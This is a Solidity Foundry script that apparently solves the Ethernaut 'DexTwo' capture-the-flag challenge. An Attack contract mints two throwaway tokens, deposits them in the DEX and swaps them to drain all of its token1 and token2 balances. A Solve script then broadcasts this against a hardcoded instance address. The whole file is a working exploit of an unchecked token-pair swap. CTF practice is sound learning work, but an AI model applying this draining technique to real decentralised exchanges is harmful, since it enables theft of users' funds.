// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {DexTwo, SwappableTokenTwo, IERC20} from "src/DexTwo.sol";

contract Attack {
    DexTwo dex;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    SwappableTokenTwo tokenX;
    SwappableTokenTwo tokenY;

    constructor(DexTwo _dex) {
        dex = _dex;

        token1 = SwappableTokenTwo(dex.token1());
        token2 = SwappableTokenTwo(dex.token2());

        tokenX = new SwappableTokenTwo(address(dex), "TokenX", "X", 200);
        tokenY = new SwappableTokenTwo(address(dex), "TokenY", "Y", 200);

        token1.approve(msg.sender, address(this), type(uint256).max);
        token2.approve(msg.sender, address(this), type(uint256).max);

        tokenX.approve(address(this), address(dex), type(uint256).max);
        tokenY.approve(address(this), address(dex), type(uint256).max);
        
        bool ok1 = IERC20(tokenX).transfer(address(dex), 100);
        require(ok1);
        bool ok2 = IERC20(tokenY).transfer(address(dex), 100);
        require(ok2);
    }

    function drawFunds() public {
        dex.swap(address(tokenX), address(token1), 100);
        dex.swap(address(tokenY), address(token2), 100);
    }
}

contract Solve is Script {
    Attack attack;
    DexTwo dex;

    address instanceAddr = 0x75Bf3E1bD5c3C34558A7eB8b6F4c6CF06f87fB6a;

    function run() external {
        dex = DexTwo(instanceAddr);

        vm.startBroadcast();

        attack = new Attack(dex);
        attack.drawFunds();

        vm.stopBroadcast();

        console.log("token 1 dex balance:", dex.balanceOf(dex.token1(), address(dex)));
        console.log("token 2 dex balance:", dex.balanceOf(dex.token2(), address(dex)));
    }
}
